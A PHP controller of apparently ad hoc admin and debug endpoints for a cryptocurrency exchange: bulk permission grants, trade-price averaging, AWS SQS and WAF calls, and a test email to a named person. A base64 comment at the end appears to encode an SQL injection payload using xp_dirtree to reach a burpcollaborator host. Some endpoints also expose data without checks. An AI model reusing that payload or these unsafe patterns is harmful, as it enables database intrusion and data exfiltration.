<?php

namespace Modules\api\Controllers;

use Utils\Mail;

class ProcedimentosPerigosos {
    
    public function modulos() {
        /*$ticker = \Exchanges\MercadoBitcoin::ticker();
            exit(print_r($ticker));*/
        //$idModuloHasAcao = 5;
        
        $permissaoModuloClienteRn = new \Models\Modules\Acesso\PermissaoModuloClienteRn();
        $permissaoModuloClienteRn->addToAllClient(47);
        //$permissaoModuloClienteRn->addToAllClient(46);
        
       /* $idRotinas = Array(9, 10, 11, 12, 64, 13, 14, 15, 16);
        $permissaoClienteRn = new \Models\Modules\Acesso\PermissaoClienteRn();*/
        
        /*foreach ($idRotinas as $idRotinaHasAcao) {
            $permissaoClienteRn->addToAllClient($idRotinaHasAcao);
        }*/
        
        print "ok";
        //15093064549656
        
        /*$contasBancariasRn = new \Models\Modules\Cadastro\ContaBancariaEmpresaRn();
        $contas = $contasBancariasRn->listar();
        
        $saquesRn = new \Models\Modules\Cadastro\SaqueRn();
        $saques = $saquesRn->listar();
        
        $excluir = Array();
        $verifica = false;
        
        foreach ($contas as $conta){
            foreach ($saques as $saque){
                
                if($saque->idContaBancaria != $conta->id){
                    $verifica = true;
                } else {
                    $verifica = false;
                }
                
            }
        }*/
        
               /* $usuarioRn = new \Models\Modules\Cadastro\UsuarioRn();
                    $usuarioRenato = new \Models\Modules\Cadastro\Usuario(Array("id" => 1483022582));
                    $usuarioGerson = new \Models\Modules\Cadastro\Usuario(Array("id" => 1483023872));
                    $usuarioWillian = new \Models\Modules\Cadastro\Usuario(Array("id" => 1483296797));

                    $usuarioRn->conexao->carregar($usuarioGerson);
                    $usuarioRn->conexao->carregar($usuarioRenato);
                    $usuarioRn->conexao->carregar($usuarioWillian);


                   /* if ($logado instanceof \Models\Modules\Cadastro\Usuario) {
                        $ident = " USR {$logado->id}";
                    } else if ($logado instanceof \Models\Modules\Cadastro\Cliente){
                        $ident = " CLI {$logado->id}";
                    } else {
                        $ident = " NO AUTH";
                    }*/

                    //$msg = "ALERTA: SQL INJECTION: Teste";

                    /*\Firebase\FirebaseSend::send("SQL Injection!", $msg, $usuarioRenato);
                    \Firebase\FirebaseSend::send("SQL Injection!", $msg, $usuarioGerson);
                    \Firebase\FirebaseSend::send("SQL Injection!", $msg, $usuarioVagner);*/
                    
                   /* $sms = new \Utils\Sms("+55", $usuarioGerson->celular, $msg);
                    $sms->enviar();
                    
                    $sms = new \Utils\Sms("+55", $usuarioRenato->celular, $msg);
                    $sms->enviar();
                    
                    $sms = new \Utils\Sms("+55", $usuarioWillian->celular, $msg);
                    $sms->enviar();*/
                    
        
        
        
        
        
    }
    
    public function negociacao($params){
        
        $get = \Utils\Get::get($params, 0, null);
        
        $dados = explode(":", $get);
        
       
        $this->calcular(null, $dados[0], $dados[1]);  //15093064549656
    }
    
    public function calcular($tipo, $idCliente, $data) {
        
        if($data == null){
            $dataInicial = new \Utils\Data(date("d/m/Y 00:00:00"));
            $dataFinal = new \Utils\Data(date("d/m/Y 23:59:59")); 
        } else {
    
           $novaData = explode("-", $data);
           
           $dataInicial = new \Utils\Data(date("{$novaData[0]}/{$novaData[1]}/{$novaData[2]} 00:00:00"));
           $dataFinal = new \Utils\Data(date("{$novaData[0]}/{$novaData[1]}/{$novaData[2]} 23:59:59"));
           
        }
        
        $ordemExecutadaRn = new \Models\Modules\Cadastro\OrdemExecutadaRn;
        $paridade = new \Models\Modules\Cadastro\Paridade(Array("id" => 1));
        $parindadeRn = new \Models\Modules\Cadastro\ParidadeRn();
        
        $parindadeRn->carregar($paridade);
            
        $result = $ordemExecutadaRn->filtrar($paridade, $dataInicial, $dataFinal, "T", "T", $idCliente);
        
        $totalCotacaoCompra = 0;
        $totalVolumeCompra = 0;
        $totalCotacaoVenda = 0;
        $totalVolumeVenda = 0;
        $iCompra = 0;
        $iVenda = 0;
        $compras = Array();
        $vendas = Array();

        if (sizeof($result) > 0) {
            foreach ($result as $ordem) {
                
                if ($ordem->tipo == "V") {                    
                    if ($ordem->idClienteVendedor == $idCliente) {
                        $compras[] = $ordem;
                    }
                    if ($ordem->idClienteComprador == $idCliente) {
                        $vendas[] = $ordem;
                    }
                }
                if($ordem->tipo == "C"){
                    if ($ordem->idClienteComprador == $idCliente) {
                        $compras[] = $ordem;
                    }
                    if ($ordem->idClienteVendedor == $idCliente) {
                        $vendas[] = $ordem;
                    }
                }
            }
        }
        
        if(sizeof($compras) > 0){
            foreach ($compras as $compra){
              ++$iCompra;  
              $totalCotacaoCompra = $totalCotacaoCompra + $compra->quoteVolume;
              $totalVolumeCompra = $totalVolumeCompra + $compra->volumeExecutado;  
            }
        }
        
        $mediaCompra = $totalCotacaoCompra / $totalVolumeCompra;
        //exit($mediaCompra . " = " . $totalCotacaoCompra . " / " . $totalVolumeCompra);
        echo "Média do valor de Compra - " . $dataInicial->formatar(\Utils\Data::FORMATO_PT_BR) . "<br>";
        echo "Qtd. Operações de Compra: " . $iCompra . "<br>";
        echo "Volume Total: " . number_format(($totalVolumeCompra > 0 ? $totalVolumeCompra : 0), 8, ",", ".") . "<br>";
        echo "Preço Médio: R$ " . number_format(($mediaCompra > 0 ? $mediaCompra : 0), 2, ",", ".") . "<br>";
        echo "********************************** <br>";
        
        
        if(sizeof($vendas) > 0){
            foreach ($vendas as $venda){
               ++$iVenda;
               $totalCotacaoVenda = $totalCotacaoVenda + $venda->quoteVolume;
               $totalVolumeVenda = $totalVolumeVenda + $venda->volumeExecutado;  
            }
        }
        
        $mediaVenda = $totalCotacaoVenda / $totalVolumeVenda;

        echo "Média do valor de Venda - " . $dataInicial->formatar(\Utils\Data::FORMATO_PT_BR) . "<br>";
        echo "Qtd. Operações de Venda: ". $iVenda . "<br>";
        echo "Volume Total: " . number_format(($totalVolumeVenda > 0 ? $totalVolumeVenda : 0), 8, ",", ".") . "<br>";
        echo "Preço Médio: R$ " . number_format(($mediaVenda > 0 ? $mediaVenda : 0), 2, ",", ".") . "<br>";
        echo "********************************** <br>";
        
        
    }
    
    public function testeLbd($params) {    
        
         try
        {
            $json = file_get_contents('php://input');
             
            $clientSQS = new \Aws\Sqs\SqsClient([
                'credentials' => [
                    'key' => getenv("EnvLambdaKey"),
                    'secret' => getenv("EnvLambdaSecret"),
                ],
                'region' => "us-east-1",
                'version' => '2012-11-05'
            ]);
            
            $object = json_decode($json);
            
            $paramsSQS  = [
                'MessageDeduplicationId'=> strtotime(date("Y-m-d H:i:s")),
                'MessageGroupId'=>'group1',
                'MessageBody' => json_encode($object->body),
                'QueueUrl' => $object->url
            ];
            
            $result = $clientSQS->sendMessage($paramsSQS);
            
            //var_dump($result);
        
            return true;
        }
        catch(\Aws\Exception\AwsException  $e)
        {   
            var_dump($e->getMessage());
            return false;
        }
    }
    
    
    public function testeEmail($params) {    
        
         try
        {
            $conteudo = Mail::template(Array("nome" => "Willian", "email" => "willianchiquetto@gmail.com", "nome1" => "Willian1", "email1" => "willianchiquetto@gmail.com1", "nome2" => "Willian2", "email2" => "2willianchiquetto@gmail.com"), "Teste cabeçalho", "Teste titulo", "teste rodape");

            //exit($conteudo);

            $listaEnvio = Array(
                Array("nome" => "Willian", "email" => "willianchiquetto@gmail.com")
            );

            $mail = new \Utils\Mail("Empresa Nome", "Teste", $conteudo, $listaEnvio);
            $mail->send();

        }
        
        catch(\Aws\Exception\AwsException  $e)
        {   
            
            var_dump($e->getMessage());
            //return false;
        }
    }
    
    
    public function testeSql($params) {    
        
        //exit("OK");
        //$contas = new \Models\Modules\Cadastro\AtarContas(Array("id" => 2461));
        
        //$contasRn = new \Models\Modules\Cadastro\AtarContasRn();
        
        //$contasRn->conexao->carregar($contas);
        
        //exit(print_r($contas));
        
        //$contasRn->gerarContaCorrente($contas);
        
        
        
        $get = \Utils\Post::get($params, "teste", null);
        
        $clientSQS = new \Aws\WAFV2\WAFV2Client([
                'credentials' => [
                    'key' => getenv("EnvLambdaKey"),
                    'secret' => getenv("EnvLambdaSecret"),
                ],
                'region' => "us-east-1",
                'version' => '2019-07-29'
            ]);
         
         
        $paramsSQS = [
            'Id' => '953c7dd1-1ef9-410d-9897-761ac5c9f4e1', // REQUIRED
            'Name' => 'bloqueados', // REQUIRED
            'Scope' => 'REGIONAL', // REQUIRED
            ];
         
        $ipSet = $clientSQS->getIPSet($paramsSQS);
        
        //$ips = $ipSet->data
                
                /*

                    1 - INFORMAÇÕES PARA AWS
                 * 
                 * PRIMEIRAMENTE PRECISA ATUALICAR A VERSÃO DO SDK DA AWS
                 * 
                 * PARA FAZER O UPDATE, PRIMEIRAMENTE PRECISA RECUPERAR O OBJETO COM O GETIPSET, CARREGAR AS INFORMAÇÕES E ADICIONAR O IP. DEPOIS FAZER A ATUALIZAÇÃO.
                 * A ATUALIZAÇÃO SOBRESCREVE DIRETO O OBJETO NA AWS
                 * ,                 */
        
        
        
        
            
//        $paramsSQS = [
//            'Addresses' => $ipSet->, // REQUIRED
//            'Description' => '',
//            'Id' => '953c7dd1-1ef9-410d-9897-761ac5c9f4e1', // REQUIRED
//            'LockToken' => '90325b71-3f0f-443b-871b-00d472146c21', // REQUIRED
//            'Name' => 'bloqueados', // REQUIRED
//            'Scope' => 'REGIONAL', // REQUIRED
//        ];

         
         $paramsSQS = [
            'Id' => '953c7dd1-1ef9-410d-9897-761ac5c9f4e1', // REQUIRED
            'Name' => 'bloqueados', // REQUIRED
            'Scope' => 'REGIONAL', // REQUIRED
            ];
            $result = $clientSQS->getIPSet($paramsSQS);
        
        exit(print_r($result));

        
        
        //$documento = new \Documento\IWebService();
        
        //$dados = $documento->consultarCnpj($get);
        
        //exit(print_r($dados));

        //$atarApi = new \Atar\AtarApi();
        
        //exit(print_r($atarApi->consultarTransferencia($get)));
        //\Utils\Notificacao::notificar($get, true, true);
        
        //$dados = \Utils\Criptografia::decriptyPostId($get);
        exit("OK");
        
        //$get = \Utils\Validacao::limparString($get, false);

        //exit($get); VVFVFRPICBUZXN0ZSBAIyMs1MSEyQDMjV0lMTEnDo04gQ0hJU
        //$teste = \Utils\Validacao::verificarNomeCompleto($get);
        
        //$clienteRn = new \Models\Modules\Cadastro\ClienteRn();
        
        //$cliente = $clienteRn->getByEmail($get);
        
        //$dados = (URLBASE_CLIENT . \Utils\Rotas::R_REGISTER . "/" . \Utils\Criptografia::encriptyPostId($cliente->id));
        
        //exit($get);
//        $dados = \Utils\Criptografia::decriptyPostId($get, false);
//        exit($dados);
//        if($teste){
//            exit("true");
//        } else {
//            exit("false");
//        }
        
        //$dados = explode(":", $dados);
        
        
        //exit(\Utils\Criptografia::decriptyPostId(trim($dados[1]), false));
        
        //pZG82b3VmbTNlcTVldS5idXJwY29sbGFiJysnb3JhdG9yLm5ldFxcaGJ6XCcgZXhlYyBtYXN0ZXIuZGJvLnhwX2RpcnRyZWUgQHEgn0MSEyQDMjamVta2Uga3VhcilkZWNsYXJlIEBxIHZhcmNoYXIoOTkpc2V0IEBxXFw9J1xcXFxwcGl3bXo3ZHdndW80dWZvbmFscjZkam1
        
    }
    
}